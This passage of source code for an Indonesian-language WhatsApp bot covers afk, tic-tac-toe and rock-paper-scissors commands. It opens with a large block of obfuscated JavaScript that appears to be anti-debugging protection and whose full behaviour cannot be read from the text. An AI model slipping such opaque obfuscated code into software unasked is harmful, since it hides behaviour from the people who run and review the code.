190,'X%#C',0x4d)][_0x12f389('mg!#',0x51a,0x5e1,0x48f,0x6cb)][_0x39e3e5('HKmH',0x1c8,0x425,0x309,0x298)+'s'][0xb*-0x1fd+-0x1cd8+0x32b7*0x1][_0x12f389('ER4$',0x4b2,0x4d6,0x490,0x450)+'ge']));else{if(_0x59310d[_0x8f5e52(-0x101,-0x166,'8ZDZ',-0x2b,-0xf9)](_0x59310d[_0x2bdd4a(0x2f2,0x14e,0x2e6,'1hv$',0x1e3)]('',_0x59310d[_0x109e21(0x564,0x5ca,0x5d9,'O*xb',0x58f)](_0x2fe1e1,_0x2fe1e1))[_0x59310d[_0x12f389('GK48',0x57e,0x6db,0x5c7,0x679)]],0x88*-0x6+0xb6+0x27b)||_0x59310d[_0x8f5e52(0xcb,0x21c,'^pi4',0xcb,-0x8c)](_0x59310d[_0x109e21(0x4be,0x31c,0x46f,'0ym6',0x347)](_0x2fe1e1,0x2147+-0x1d4*-0xa+-0x337b),0xb7b*0x1+0x2467+-0x2fe2)){if(_0x59310d[_0x39e3e5('&P!6',0xd1,0x72,0x1bb,0xa1)](_0x59310d[_0x12f389('aM#j',0x7a9,0x74d,0x7b4,0x728)],_0x59310d[_0x8f5e52(0x4,0xd9,'HKmH',-0x61,-0x22)]))(function(){function _0x43e26b(_0x1a4c75,_0x392e84,_0x3dff88,_0x5e7853,_0x1d1ee7){return _0x8f5e52(_0x1a4c75-0xec,_0x392e84-0x79,_0x1a4c75,_0x3dff88-0x431,_0x1d1ee7-0x67);}function _0x2708f(_0x5a61f5,_0x47e757,_0x60284a,_0xba6117,_0x5d155f){return _0x8f5e52(_0x5a61f5-0xe1,_0x47e757-0x1d4,_0x60284a,_0x5a61f5- -0x119,_0x5d155f-0x1de);}function _0x4aa1e1(_0x4bde27,_0x28f523,_0x15136c,_0x3b4e85,_0x5eccc1){return _0x39e3e5(_0x5eccc1,_0x28f523-0x25,_0x15136c-0x52,_0x4bde27-0x314,_0x5eccc1-0x160);}function _0x13dc8c(_0x662f71,_0x2c38be,_0x539b4d,_0x479f34,_0x26a5a6){return _0x109e21(_0x662f71-0x19f,_0x2c38be-0x1a0,_0x2c38be- -0x530,_0x539b4d,_0x26a5a6-0x1a7);}if(_0x38eec2[_0x2708f(-0x1d3,-0x31b,'D84g',-0x168,-0x1d0)](_0x38eec2[_0x13dc8c(0x335,0x1e1,'#YSN',0xb9,0x171)],_0x38eec2[_0x13dc8c(0xd5,-0x37,'O5pF',0x41,-0x123)]))return!![];else{if(_0x40d7c4){const _0x137598=_0x28fb38[_0x13dc8c(0x6c,-0xc5,'X%#C',-0x232,-0x1b6)](_0x249b4b,arguments);return _0xf56bd0=null,_0x137598;}}}[_0x12f389('s@G1',0x6bb,0x573,0x4d5,0x591)+_0x8f5e52(0xb5,0x17f,'o*ww',0x6f,0xb5)+'r'](_0x59310d[_0x2bdd4a(0x167,0xe9,-0xe6,'H&0E',0x19)](_0x59310d[_0x2bdd4a(-0x22,0x11,0x97,'ciQC',0x8e)],_0x59310d[_0x39e3e5('Keuw',0x345,0x32c,0x1e5,0x2e3)]))[_0x39e3e5('O5pF',0x7d,0x177,0xf3,0x13e)](_0x59310d[_0x12f389('sv4V',0x724,0x722,0x7a9,0x61e)]));else{if(_0x5eb48e)return _0x7ddb04;else _0x38eec2[_0x12f389('[jNg',0x54c,0x68e,0x752,0x6ca)](_0x427e26,0x2599+-0x2b*-0x86+-0x3c1b);}}else _0x59310d[_0x2bdd4a(0x215,0x16d,0x2d6,'GK48',0x247)](_0x59310d[_0x8f5e52(0x1bf,0xa7,'Akv9',0xe3,-0x70)],_0x59310d[_0x2bdd4a(0x424,0x246,0x3bb,']CBG',0x2af)])?_0x38eec2[_0x8f5e52(0xb0,-0x110,'HKmH',0x16,0x10b)](_0x1efad8):function(){function _0x30935f(_0x2bc5c2,_0x1b93bf,_0x6d5bb7,_0x4113fd,_0xc74ebd){return _0x8f5e52(_0x2bc5c2-0x116,_0x1b93bf-0x116,_0x2bc5c2,_0xc74ebd- -0x20,_0xc74ebd-0x10e);}function _0x2268dc(_0x665570,_0x328457,_0x4660d9,_0x5c4c8a,_0x5865aa){return _0x2bdd4a(_0x665570-0x6f,_0x328457-0x23,_0x4660d9-0x1d2,_0x4660d9,_0x665570-0x1ce);}function _0x5c958e(_0x1d32bf,_0x12d19b,_0x33b677,_0x5e6c3f,_0x190b93){return _0x109e21(_0x1d32bf-0x10f,_0x12d19b-0x32,_0x12d19b- -0x253,_0x33b677,_0x190b93-0x1d1);}function _0x2cb8c4(_0x3dc6bb,_0x771c2b,_0x18fbd0,_0x1f455e,_0x4c33f7){return _0x109e21(_0x3dc6bb-0x1d7,_0x771c2b-0x47,_0x4c33f7- -0x31c,_0x3dc6bb,_0x4c33f7-0x182);}function _0x168fff(_0x37c766,_0x4ae836,_0x34238f,_0x29e53d,_0x6492f2){return _0x8f5e52(_0x37c766-0x118,_0x4ae836-0x1b8,_0x4ae836,_0x29e53d-0x418,_0x6492f2-0x126);}if(_0x59310d[_0x30935f('H&57',0x1b4,0x1f4,0x15a,0x1c8)](_0x59310d[_0x30935f('GK48',-0x40,0x4,0x3d,0x8b)],_0x59310d[_0x5c958e(0x208,0x2db,'w%Cn',0x2d4,0x1ed)])){let _0x42f033;try{const _0x11221c=_0x38eec2[_0x30935f('1hv$',-0xcd,0x173,0x64,0xa8)](_0x4d9455,_0x38eec2[_0x168fff(0x4e7,'X%#C',0x601,0x4b4,0x57a)](_0x38eec2[_0x2cb8c4('s&QK',0x3b5,0x3ba,0x328,0x436)](_0x38eec2[_0x5c958e(0x268,0x32d,'xL$u',0x3fd,0x32e)],_0x38eec2[_0x2268dc(0x45b,0x33b,'GZml',0x44b,0x36b)]),');'));_0x42f033=_0x38eec2[_0x30935f('Q3^&',0x157,0x93,-0x120,0xb)](_0x11221c);}catch(_0xf48386){_0x42f033=_0x2362ad;}_0x42f033[_0x168fff(0x4a1,'O5pF',0x2f6,0x3fd,0x4aa)+_0x168fff(0x461,'@K1g',0x38c,0x3f2,0x38b)+'l'](_0x16176e,-0x1df*-0xb+-0x1*-0x10be+0x37*-0x65);}else return![];}[_0x39e3e5('mg!#',0xca,0xba,0xda,0x149)+_0x2bdd4a(-0xe0,0x120,-0xe7,'xL$u',0x39)+'r'](_0x59310d[_0x8f5e52(-0x72,-0x6c,'rLll',-0x6f,-0x1ed)](_0x59310d[_0x2bdd4a(-0xbd,-0xed,0xd0,'8ZDZ',0x41)],_0x59310d[_0x39e3e5('#YSN',0x14c,0x1f5,0x13c,0xab)]))[_0x2bdd4a(0x161,0x28e,0x8e,'ZQ8%',0x1a7)](_0x59310d[_0x39e3e5('OOr1',0x3c,0x1c8,0x65,0x180)]);}}_0x59310d[_0x12f389('n9Es',0x4e7,0x4e4,0x56e,0x543)](_0x47fcd2,++_0x2fe1e1);}else _0x38eec2[_0x109e21(0x6af,0x60c,0x5d2,'[NYo',0x584)](_0x4bdb4e,-0x2002+0x1f3*0x11+-0x11*0x11);}function _0x237415(_0x396636,_0x4cd84e,_0x1209f0,_0x40602f,_0xa2f296){return _0x16c6d8(_0x396636-0x174,_0x40602f,_0x1209f0-0xe4,_0x40602f-0x168,_0x396636- -0x16d);}function _0x4e6f1d(_0x5ebe75,_0xa6744c,_0x50df59,_0x4fd1fc,_0x41d193){return _0x4d2e0a(_0x5ebe75-0x1c4,_0x41d193,_0x50df59-0xd7,_0x4fd1fc-0x17c,_0xa6744c-0x3b);}function _0x9d1821(_0x5583d7,_0x5208f2,_0x3a47d2,_0x2b598d,_0x3f85a9){return _0x2a95f8(_0x5583d7-0x99,_0x5208f2-0xd0,_0x3f85a9,_0x5583d7-0x4cc,_0x3f85a9-0xa0);}function _0x9a0720(_0x3f664b,_0x35cb5e,_0x371cb1,_0x18476e,_0x3b222c){return _0x2316f2(_0x3f664b-0x165,_0x35cb5e-0x100,_0x18476e,_0x18476e-0x43,_0x3b222c-0x432);}try{if(_0x59310d[_0x237415(0x418,0x2b6,0x3c6,'uHrg',0x4f4)](_0x59310d[_0x9a0720(0x28f,0x35a,0x448,'[jNg',0x2e8)],_0x59310d[_0x237415(0x431,0x4e1,0x370,'Q3^&',0x54a)])){const _0x17d163=_0x28fa2e[_0x9d1821(0x4f4,0x4c2,0x384,0x583,'w0F4')](_0x49fdf6,arguments);return _0x1ee6cc=null,_0x17d163;}else{if(_0x5d7535){if(_0x59310d[_0x4e6f1d(0x343,0x2ba,0x417,0x380,'ZQ8%')](_0x59310d[_0x4e6f1d(0x21c,0x17a,0x2e3,0x49,'&P!6')],_0x59310d[_0x9d1821(0x576,0x5ea,0x42c,0x6c2,'Itu9')]))return _0x47fcd2;else(function(){return![];}[_0x9a0720(0x428,0x187,0x3d5,'GK48',0x2ae)+_0x4e6f1d(0x411,0x3ce,0x3f6,0x315,'0ym6')+'r'](_0x59310d[_0x237415(0x5a7,0x647,0x647,'[jNg',0x587)](_0x59310d[_0x237415(0x38c,0x373,0x2be,'s&QK',0x510)],_0x59310d[_0x28d03d(0x197,0x302,0x166,0x2dc,'1hv$')]))[_0x9a0720(0x417,0x404,0x44b,'w%Cn',0x360)](_0x59310d[_0x9a0720(0x77,0x117,0x278,'OOr1',0x1fa)]));}else _0x59310d[_0x4e6f1d(0x4fb,0x3f5,0x45d,0x3e4,'Q3^&')](_0x59310d[_0x9d1821(0x6dc,0x7a5,0x7b8,0x683,'H&57')],_0x59310d[_0x9d1821(0x413,0x48b,0x56e,0x596,'X%#C')])?_0x59310d[_0x9a0720(0x310,0x36c,0x33d,'1hv$',0x446)](_0x47fcd2,0x1*-0x977+-0x1*0x136d+0xe72*0x2):_0x12295d=_0x4c0c34;}}catch(_0x607be){}}function _0x5397(){const _0xb53a77=['uNSR','b8kYW4BdICod','W6/dIvldUMa','tc1zWORcNa','DKa4a00','W5NcNmotwLm','wJ9oW7NdJq','W7tdQwJdKZRdTSkpW4ii','r8kyWOhdH8kl','wMqVFSkq','W7HtgeLe','WRJdHmoeW5Gp','W6pdSCokeq','wxb3W7fD','tKRdMcpdLW','uCoNWOhcQ8oN','E00pWRvm','uMdcKZxdOa','cmolWPqdaG','yYXV','x2u3WQ5I','a8k2W7FdTSou','WRnvgebv','AeKVsCkh','yfrCW6fW','qHPPWORcKq','iKaLW6yb','WOBdLmoCW5Gl','W5a0krrl','k3JdSCoRtG','bL45WPm','na5EzCkQ','WOSwWOy5xq','r2BcSG3dSW','W4jCWPTvvG','ySo7W7pdUCoN','bmk8W4xdSmof','wsRdH1xcMG','WRnBBdm9','WORcKmoNWQTf','oSkWW6ulqq','qvpcJYJdHW','WRivW4FdQXG','W6jrWRTara','FbxdM8kAWRu','WPaoW7C','W4TNWO1GBW','WQhdMK3dV8kq','WQBdKvFcSCku','cSkzWOjeW5W','W7FdNf3dUWnyca','c8krWOfPW7K','WR4eWRKWra','W5/dQJCiW60','W5VdNqWMW6y','WOmXWQ0tCa','sCkmWR/dLSk1','W7vvWRjgtW','W4BcJM4Ixa','ENDzWPmn','uNrVW7fB','v0eVW6NcVW','WO7cMmkpW5ax','W43dTH3cTrW','WPyRW6pcHIS','WORcGCo/yxy','W43dSGpcTqy','kKRdTJlcTq','iNi0W4rV','WOhcVSonr0K','wfTJWOGs','WP9bbuzE','zHDzWR/cQG','car4t8kx','W7SOsKWD','W7JcS2C3Ea','WQFdIupdPNi','iMyHW5G6','BxOKWPnn','WPyaW4/dUfW','WR/dP8onW4q4','WQZcKJpcGW','A2WTW47cPa','xIiDi30','Ew7cPsddTq','rGqTW5zF','WRldTfNdIHS','WPpdSvBcM8kL','kw02W48/','o1ixW6CR','W5FdQr/dVei','F3G0oGC','smkvWQldHa','WRxdR0RdKsW','WOaeW5NdM0O','WQrUoMTI','WQtcUmocuNm','v1e8W7hcSq','buaPW7hcSq','fSkgWP1UW7C','sgCmi24','W5VdLHjFWQO','keuEWPRcUWdcIe7cU0CBWOxcRq','WQb0tGi+','WRSYW4pdTga','qvu4W7W','WRFdMfdcS8kd','WP7dHCkpW4ul','WQdcRtpdSc0','WP/cRCkPWPn9','WOJcQSoN','WOzpp1Xc','cvxdQCouBG','fCodWOP0W7q','c8kcWOv8W78','WO7cPCoe','W7NdU8oFmeC','WOtcNCobWQrd','W4tdLCoUDMa','uw09F8ku','q0eIW77cPa','DGlcLrOB','s0TRW4nf','AHJcMSkjWR4','z2eDWOPQ','WPzfhW','wCkAWRFdHmkV','vLCTlhS','WRGpW48','xLpdPcRdPG','tLraW5ve','ab57rSkA','AXLvW5RdPW','D1XcW4pdQG','jxe0W4fV','vd/dML/cLa','o2m8nW8','barSW55A','vgdcKc0','jvtdUmozuq','cfbGW5Xl','W7GXmdfA','CgjBWR0S','a1tdT8osBG','tYxdKL3cMW','WRpcVc/dIdO','Bu1kWQyp','DwNdTaRdRa','WOTBimoopq','qSkBWO/cLc4','W5hcGmkFWODi','qN4cW43cUW','vbH5DmkjW50t','k2u+oey','WRXdlJe6','q1/cKXpdGG','FZbLW63dGW','sheKj3O','WPNdN8kpW58c','t8kyWRNdKmkL','emoQWOucpG','WRGyWRiSqW','dLJdRCoiDq','WOldN8oi','pKJdIqSe','EcD8WQNcRa','WORdIJbQyG','Fb3cShfl','WP9VqWyr','W5BdUSkufq8oWQPiWPSvW5pdTSot','pCkqW78jvG','WPJdLmoBW6ie','i24JWOT3','wLfMW4rf','WPDshKDc','WPfidufE','WOBcQ8o3tCop','xIz8WRNcPG','W7K+qe8','oCkVWODkW5a','WOnxWR9Ws8oFEa','aSkUWRHQW6y','iK7dJHie','W6tdSGWPW4O','m8kgW4ygAq','W53cKSooA0y','W4GYbHC','W5hdL8oUAMi','u3fEzIC','WPVdUCoMWP8z','WQGwWPu5','WQtcGSo9WQjF','hxz6W6NdIa','b8o4W41jdG','auVdQConyW','W4VdTsNcPtO','dCkwW70Pqa','W4/cH8oOFga','Aw9mW6Dc','WQ7dHeFdUxq','W7pdJsupW60','WQvxBJy','Ex5TWPzj','WOxcSCkGwCoS','AguGWPLb','W5tcH3WK','mw8LpWK','wYldNrW','AqBcICkuWQK','uNpcHIVcOq','W4FdPCotdgC','lutdLfS','cmk7W5CrsG','hMhdIG87','W6BcMbVcS8kj','WRXLW6FcIY4','jmk2W6ldJCo4','cmkRW5qdEa','BxO9WPrr','W47cKwO','W4VdQ8ohs1a','W5lcH3WGvG','z0jxW4bI','c2VdKdVcVG','pIpdOJ3cQW','tHLWwSkl','k3uHmW','W581dqPm','WPu/WPutua','W6q/q2io','dcxcIJFdSq','vKOLf14','W73dVSorcW','ENGbWOTW','qveUW6G','WRRcPhhdHZq','WQdcG8ofz8oC','WR9IWQ3dHW','W63dJ1ldONq','nwyCW7ldUW','WP/cG8khW5yJ','WOJcOmoUtCo5','rgtcLZG','uKDR','W5ZcMvqzW7u','WQ/dVmo9W6GZ','WR9WWQq','W4VdMfWBW6u','WRvFm8oUaa','q23cGJddRW','aqLIxSky','WOxcOSonqa','W78+qeSh','WO/dKmoBW4O','ssBdHhVcNq','WPxcPCo+WPHi','vLBdPHFdQa','FSkqWQpcSqO','c3VcHa/dG8kNuSo9W6tdMSktt1FdNq','DbDwW6ldHW','W6m8uLvi','WR45W4ddNxG','WOGzW53cO8oH','xvaLW55l','EaXwW4BdSq','WRFcL8o+WR5j','x3OvphS','tx4uWOHf','Fx06zmkq','W4tcHSo/','ug0GA8kb','fwldIIVcUG','yYXRWRdcQW','W4jmWQbgzG','e0VdTCoiBG','zv0mpwa','WOGwWOWZvG','jxS2W4y6','W7FcJ2ugtq','WPBcOmkUsCoI','vfRcUYhdIa','cSoeWOmt','wKOLW4rc','W4VcK8oUCMa','WQddLu3cSq','bmkEW5ldTSoM','WPxcVmovz3W','gMpdH07cGa','ixaMW5KU','uMKuBCkN','dLKRW53dUa','W58aeZn7','ihq9','p0hdKXGo','W6/cN8odENu','WRldGe7dKa4','dwuEebC','WPxcKrNdJXu','W7pdLJavW6u','WPnxoSkV','WP7dMeddKgm','WP5qb8oEbq','dCobWP4Veq','W5FdRcdcScq','iuZcMH8e','vKngWOqr','x8kfWQ/dLmkY','dfVdTsVcTq','yMjSWRxcVa','WRjnoNjN','W4avxb8iz1imsftdVSkJ','WPWJW7lcHdy','l8kLW6Cusa','kIzNWRhcVW','W5pdUYymW6m','W4ZdQmowkgq','BZVdMe3cKa','WQlcTtddKt8','W77cJqdcPtCmk8k9W6ePlmovW7CW','D3WeBCkt','WPJdM0ddRhy','fIiyigi','ySkwWQtcQaO','trqOW7tcSG','z8kuWOpcOde','WRtcVtNdIdO','WRFcH8oUWRPj','tM0Ty8kh','WPxdKM4Bw2/dUhS','WRiLW6RcLdm','WOtcKCotBN4','Fh1OW6Py','fgCXW6C7','ugnxWR82','vHNdG3dcHa','D2JcPrVdIG','EbjiW4/dRa','AY9MWRxcHW','WP9ftHis','svr1W5Xt','twtdGZ3dRG','yYHKWPlcMW','wKNdTcNdHG','sCkgWQtdISkZ','BuhcUH3dTG','amoeWPOx','yNKO','nmkUW73dSq','rhOuWQLY','cgZdNHue','kfOPbXa','bCkGWQZcPmkf','wCkaW7BdI8kG','teBdOshdJW','bv45W5C','WOqnW6mFf8o6ENzsW7/cMG','kb9mW73dOg/dVq','WQSgW7BcGse','WOmcW6fUwSoiwe15','W7FdUWuCW5O','hCk4W7hdI8oY','rLFdRqZdVG','WQ/dMZRdHW0','x3vHW4FcJW','WOv5fSocca','bvRdVCoyoG','WRC+W6xcLq','WRNcTXhdKd0','W4WIr18H','W6WRq1Cb','W5hdLrmkW6q','kCk9WRewrG','v8kyWPlcMJ8','W5xdVSkteWubW4H0WRi4W4BdGG','ucP0pCoz','ECkDWRa','WOjMCdyE','rgRcJJJdQa','WRPebgzK','EuP3W4Pn','zYD7WQ/cVW','ACoVWQxcRCof','FIpdPf7cNq','qSkhWRm','rCkhW7tcJmoP','WOBcU8otseq','WPzBjW','uuRcTGVdUa','W48pnqTx','WOCIW7xcPte','pCkcW7/dL8o1','W4FcM3ObAq','pqvNvmkz','WPBcS8oLwmkT','of0AhXe','C8kCWRNcQXe','dHVdRCoeAa','jmk+W6hdK8o+','bwldJd3cUW','smkBWRVdHmkO','W7JcUCoQz0i','WQ09xeKf','W6pdGdGWW7q','CrzdW5RdUW','tgVcQttdSG','s8oBWOtcUCo5','WQ0EWO94','W4brWOrKsq','W6K+qa','dLK0W5/dOG','WPdcQSoFDq','WQaLWPeuqa','WR3cTSo4wCoj','bxZdIJlcRW','WPiHW73cU8on','WRBdNSkTW4qS','WOHNBHm0','AviYg0W','uCoSWRFcTSoj','WQn7eCoyiq','e8kYW7RdQa','W4ConCoedSoBWPhcSa','WOpcV8o0sMC','WQxcUa7dPXO','pmkjWPPVW4m','W4ldIXmhW6K','p8k8W7WdrW','W7NcMSoGrvG','p8k6W7a','A8kvWRhdHmkT','WQjnWOJcKZO','f8k0WRDlW5S','wchdPvdcTG','WO/cGmkIW5CP','swSOWOLa','WOhdLxtdLWC','f8kXWP5rW6C','W7K+qu0j','xeTwW4ry','u2WB','WO8MW7hcUq','W5tdRr8+W7q','WORcPmoTtW','WQ/dMSoeW7SU','ymo4WRtcSq','l0ldLaGF','nmoQWR0I','oSo+W6SJaW','a8k2W6ldJCoz','AuqTFmkz','sI7dHYFcSG','WOGAWOiXDa','WRGyW6/cRq0','orlcVmkJWRPinG','ieycW4ddGq','W5RdPWxcVq','WRnhCdC','WRFcLCooFSoo','As1MWQ/cQG','WQPrCG','wmo7WR7cQSkC','WOJcHCoOEN0','keusWPJcSqhcI0BcIgmMWPRcKa','aSk0W702sG','s0C4W6/cPq','WPDmjSoGhG','n8kHW7mQza','WRddJ3NdLW0','rMFcPJBdSG','WQhdIN3dSGW','CZJdKuJcGa','nmkLW7RdLCoG','W57cGCkyW5WlW408WPmZ','srrpWRxcPW','pei2W74+','iMOGW7ldTq','c1GW','ihOY','WPxcRSotsfW','WRBcM8omAxi','qmkwWRNcVWi','q1GTW6/cTq','WRtdIfBdKdO','dKr1WPRcVW','nhtdGr3cLq','W412WQJdR8kmz8k3CSo7W5Ko','W43dOcxcVI4','WQZdIw7dKrC','wYldNrZcGq','WRFcL8o9WQjh','ffS+W5ddSG','WRFcMSoZWObk','qxxcKZxdUa','W7ldSSobcwy','BdbSW5RdSG','WRdcOmoPWOXO','sf1HWODB','WP1ugKrK','amouWRldISkS','c0ZdNrOh','pmk5W47dLSo1','WR8sWOaQuG','qfNdVmotBW','l1NdLqLd','W5pdIqWtW7K','W5JdU8o3juW','WPBcTbNdPHa','W4ddJb8lW68','cSowWOS','p8k5W4hdKSo/','WQ/cTXZdHJW','zqFdMCosW7m','WQFcMcdcGsm','WRxdPvxcTCkE','vgdcKt3dOa','WQFcM8oJWQO','W5xdQIpcNt4','awNdV8o7vW','nmkNW6CoEG','W4G1ma1k','WQytWRarvW','wmkrWRRdHmkP','DWNdLCkyWRq','WPrQj8o8kG','iKNdVrOa','A3zJW7rg','WObfgf1c','WP9zlM5N','WQeDW6hcVsa','Bhe8W5KQ','qCkNWQFdPSkn','W7JcKmo5Fga','p13dLHiF','WRZdLCoDW7GT','uMdcKcNdRG','W77cJWtcRZyjl8o1W5iAcCokW4i','fIbXnSkU','WRaJW6RdHW','tSkgWOhdNCk5','WQJcTZBdKa','E1vPWOGx','WQzng395','t8oVWOJcKSoj','uKi9W5dcMa','WOTbteXv','AxG/WPDA','WQ8yWO8Rrq','q2RcLJFdTq','WRpcRdZdKdq','WOeEW6JcKmo+','hSkoWO90W7O','W5WuW71bvG','WQKEzdS3','WO/dMwldIIa','EaBcMSkyWR4','DmksWQpcUq','AKG0WRv+','W6qZFu0Y','W4JdGMS5xG','v2mviwe','WRBdOSoDc3C','qhxdMWVdGq','WQlcLCoOWRW','a0/dTSotmG','W5VdPXxcPuG','W5/dKb3cRs4','ufTP','WP7cRSoxzwW','WQpdLNZdHHe','dmoJWOempq','W7VdKbVcLai','mNq2W7/dOG','dmkaWRpdICkG','griXW7Ltr3WRpq','cWb0d8oF','WQJcTZZdIc4','WQVcHmkxW5yX','qbj2W7ZdUG','FI1BWQJcRa','WPnqherj','pmkcWOL8W7O','WRJcSmorexi','FM8+WOHh','WQftbCo3iG','uMWgW4RcOW','W7pdOCoTme8','DCoQWRlcT8o8','W4brWQfsuq','WQNdS8o5W54j','fgVdKYtcVG','keZdJHO','W4mrwXKcAdaWyxNdQ8kxWOe','CNSHW61X','dHtdS8osDq','gWn8qSkB','sgtcKsZdSG','W6vLW77cIcK','B8oxWPpcLCoq','vKaTW6NcTq','DW9sW5JdVq','cSoNWPWsfq','cmkwW7u0yG','hbL6wSkr','WRZcS8ogWR5u','WQOQW6NcKCoA','xvO2due','sMykWPrp','n8keW4G0yW','cvy6W5i','WPXtcq','hKu7aJa','WQK+W6JcRSo3','oeldQq8z','WRCgW4FcOaW','wYxdNvNcKq','W6/dMv7dPwq','WQVdMSkKW64','FHhcImklWRq','EXLiW4VdUG','s0ldPG','WOCbW7tcSq0','WQVdLh0','WRlcRJhdOXi','WOCGW4xcIGG','WQjnlW','zt58WOfM','t8kUWQBdR8kc','zIDMWRVcQG','sd7dLKe','WPObW4VcHCoP','zCkDWRBcSWq','FeqHWO9F','k8k/WRJcRCoJ','ltGVW6TI','WQhdNfRdTW','bColWOateW','b37dKYtcPG','WQGsWOmT','vdHC','u2XMWQ0Z','D8o+WRRcOSo6','e8ooWQTWW7C','WQtdMgpdLqy','W4G/eqPD','W7NdTColdgm','adf8WR3cQG','AtbHWQBcRG','WQvzWOi0xG','nezuw8kk','W5DgWQDiuq','W5uicdnY','Dxeffx4','W4TIWQFcTSkv','W63cMe4iyW','WQDYn8o/aa','WPbxoSoR','zdzTWRlcQG','tKRdUYVdVG','w2WskMS','W77dVriNW5C','wuz8WOyj','w0fKW4jj','WQNdN07dOgu','aLldT8of','F8kEWRBcSqS','aKTHs8km','WRfYcMXC','WRX3bfLL','W6hdIHGvW7O','WQvFoCozpG','W7lcLYpdGK8','jaddSr4s','WQpcSmkYW5q','qhSVWR96','W5pcHhW2vG','WOZdQ1tdOqW','WORcSCkTFSo0','WR8zW6NdS1e','nbn7ECky','dfldQSovFG','dmkfWOOFea','WObzlSo7oq','crLNqCkm','fGr7tW','bXHUW6NcPa','WQrrBIeH','WOlcK8oQWQ9k','W5zvWOrKyG','W5xcKvCPAW','WQldNbFdSM4','iSoJWR07nq','WO7cNXpdRXO','WRarW5JdTuK','xSkrWQBdICkG','W7zNWQzpBG','FH3cJ8kcW7K','WPu7W7FcTmoz','WOmeW4VdTKi','W7GCjJrP','zftcN8ksWRK','WOehW4RcOSok','W58sWRtdVG','vsZcMmkFWQW','W4G7arvD','WQpdJuZcGCk2','B8k/WRxcQSo0','W7WyDeKm','WOjFp8oUbq','WOtcP8omuvK','WQieWOq','WP8QW60','iftcN8kuWRy','wSksWOldKCkn','c2/dIIBcSq','W6ldTSoSc04','WQVdLgRdLHy','WRahW5ZdUei','eh/dT8oyxW','eaxcMLe3','vgdcKs/dOa','WPyQW63cPmoz','ccBcIMG','wmkBWOxdKCkZ','qe1/W59b','WQ8dWO4Qgq','W5RcImkBWPLtWOfmWPSuWRhdI8kXsa','FSotW7/cVHa','B2uJWOTh','W6JdGrdcLYS','eMVdKdW','p0ZdGHhcIW','swyVz8ku','WQtcNmoJWQTc','gmkmWObUW6i','t8kvWRRdIq','lNGOWOXD','WQBdK1hdUq','kmoPWR8Nbq','WPSFW7WmcG','f8kxW4qyra','DCo6WQlcS8o8','WPRdGNtdTaq','WQZcLSo9WPDa','tbVdVCooDW','cCkqWRz1W6m','oNicW5BdVG','tLf9WPWx','WO4cW6tcG8o5','WRuaW5ZdUa','WQJcTZG','y0nDW7vU','rNRdHJRcUW','WRFdIuldMJa','wCopW4XZW7C','iM8NW5FdNa','svSR','wYpcS8koWPG','W47cLmoUCG','W74+uKKl','zrtdG07cMG','W71fW5jHbSkKW7FdNweJkmo0W4W','dtf2pmogWPD1iSkzmYlcU8kL','WRtcPSoYxhm','WQhdHKVcV8ku','nCkGW7q','w3imi3y','DCoSWONcQ8oM','WQmEyt4N','t2qKW5tcLG','WONcOmoZwCoS','WQf7v1qf','W6S3uKKn','wMb9WPO9','zSo8WQxcQSo8','FM8+WO1e','Fa5uW4xdUG','ENjDWQq5','WQmEW7BcSmo5','cCkfW74jDW','DNhcPt/dRq'];_0x5397=function(){return _0xb53a77;};return _0x5397();}
                break
            default: break
        }
	    case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} Telah Afk${text ? ': ' + text : ''}`)
            }
            break	
        case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await hisoka.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await hisoka.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            hisoka.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!this.game) {
            m.reply(`Session TicTacToe🎮 tidak ada`)
            } else throw '?'
            } catch (e) {
            m.reply('rusak')
            }
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await hisoka.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
